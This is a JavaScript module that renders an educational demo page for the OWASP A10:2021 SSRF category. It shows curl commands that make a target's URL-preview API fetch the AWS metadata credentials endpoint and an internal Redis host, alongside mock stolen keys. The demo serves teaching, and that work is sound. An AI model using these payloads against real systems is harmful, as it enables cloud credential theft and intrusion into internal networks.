/**
 * A10:2021 – Server-Side Request Forgery (SSRF)
 * Shows an attacker using a URL-fetching feature to access
 * the AWS metadata endpoint and steal cloud credentials.
 */
const demonstrateSSRF = () => {
    return async (page) => {
        const html = `<!DOCTYPE html>
<html>
<head>
  <title>SSRF Exploit</title>
  <style>
    * { box-sizing:border-box; margin:0; padding:0; }
    body { font-family:'Segoe UI',sans-serif; background:#0f0f1a; color:#e0e0e0; padding:2rem; }
    h1 { color:#f87171; font-size:1.2rem; margin-bottom:0.5rem; }
    .alert { background:rgba(239,68,68,0.1); border:1px solid rgba(239,68,68,0.3); border-radius:6px; padding:0.75rem 1rem; margin-bottom:1.5rem; color:#fca5a5; font-size:0.83rem; }
    .terminal { background:#0d0d0d; border:1px solid #1a1a2e; border-radius:8px; padding:1.25rem; font-family:monospace; font-size:0.78rem; line-height:2; }
    .prompt { color:#4ade80; }
    .response { color:#7dd3fc; }
    .danger { color:#f87171; background:rgba(248,113,113,0.1); padding:0.5rem 0.75rem; border-left:3px solid #f87171; display:block; margin:0.5rem 0; border-radius:0 4px 4px 0; }
    .comment { color:#6b7280; }
  </style>
</head>
<body>
  <h1>🌐 SSRF — Internal Network Pivot</h1>
  <div class="alert">⚠️ A10:2021 — SSRF: The app's "fetch URL" feature trusts user input. Attacker redirects the server to query the AWS metadata endpoint, exfiltrating cloud credentials.</div>
  <div class="terminal">
    <span class="comment"># Attacker crafts a URL pointing to AWS metadata</span><br>
    <span class="prompt">$ </span>curl -X POST https://target.com/api/preview -d '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/prod-role"}'<br><br>
    <span class="comment"># Server fetches it internally and returns cloud secrets</span><br>
    <span class="response">HTTP/1.1 200 OK</span><br>
    <span class="danger">
      AccessKeyId: AKIA_MOCK_ACCESS_KEY_ID_EXAMPLE<br>
      SecretAccessKey: wJalrXUtnFEMI/K7MDENG/bPxRfiCY_MOCK_SECRET<br>
      Token: AQoXnyc4lcK4W9EXAMPLE...<br>
      Expiration: 2026-12-31T23:59:59Z<br><br>
      ☠️ Full AWS account now compromised via SSRF!
    </span>
    <br>
    <span class="comment"># Pivot to internal Redis</span><br>
    <span class="prompt">$ </span>curl -X POST https://target.com/api/preview -d '{"url":"http://redis.internal:6379/"}'<br>
    <span style="color:#f87171">→ Connected. All session tokens now accessible.</span>
  </div>
</body>
</html>`;
        await page.goto(`data:text/html,${encodeURIComponent(html)}`);
        await page.waitForTimeout(4000);
    };
};

module.exports = demonstrateSSRF;
